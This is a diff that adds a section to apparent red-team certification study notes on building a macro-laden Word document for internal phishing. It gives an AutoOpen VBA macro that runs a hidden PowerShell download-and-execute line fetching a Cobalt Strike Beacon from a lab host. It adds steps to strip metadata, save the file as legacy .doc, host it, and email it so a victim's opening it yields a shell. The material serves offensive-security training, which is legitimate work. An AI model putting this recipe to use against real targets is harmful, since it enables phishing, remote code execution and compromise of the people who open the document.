@@ -269,3 +269,36 @@ PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -Us
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/46008966-f8eb-4313-bae7-20239a9d2ff2)
 
+### VBA Macros for internal phishing
+1. create a macro in a word document by going to View > Macros > Create, then paste the following code
+```
+Sub AutoOpen()
+
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "notepad"
+
+End Sub
+```
+2. we need to replace notepad with a Beacon payload. go to Attacks > Scripted Web Delivery and generate a 64-bit PowerShell payload. The URI path can be anything, but I will keep it as /a.
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/f6b68db3-6d55-4422-8e90-79bbf1fe02c6)
+
+This will generate a PowerShell payload and host it on the team server so that it can be downloaded over HTTP and executed in-memory.  After clicking Launch, Cobalt Strike will generate the PowerShell one-liner that will do just that.
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/62a54826-dc73-45d3-b362-da0b4baf97a0)
+
+3. Copy/paste this line into the VBA and make sure to add another set of double quotation marks around the IEX command.  It should look like this:
+```
+Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""
+```
+To prepare the document for delivery, go to `File` > `Info` > `Inspect Document` > `Inspect Document`, which will bring up the Document Inspector. Click Inspect and then Remove All next to Document Properties and Personal Information.  This is to prevent the username on your system being embedded in the document.
+
+Next, go to `File` > `Save As` and save it to `C:\Payloads`.  Give it any filename, but in the Save as type dropdown, change the format from .docx to Word 97-2003 (.doc).
+
+We then want to upload this file to the team server as well.  Go to `Site Management` > `Host File` and select your document.
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/f2e55cb7-168b-4062-a727-09ea3899c169)
+
+4. send an email and attach your Word document. open the document and enable macros, then you will get a shell
+
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/99f340ed-fdf7-4008-a4d0-63dfa0ae613a)
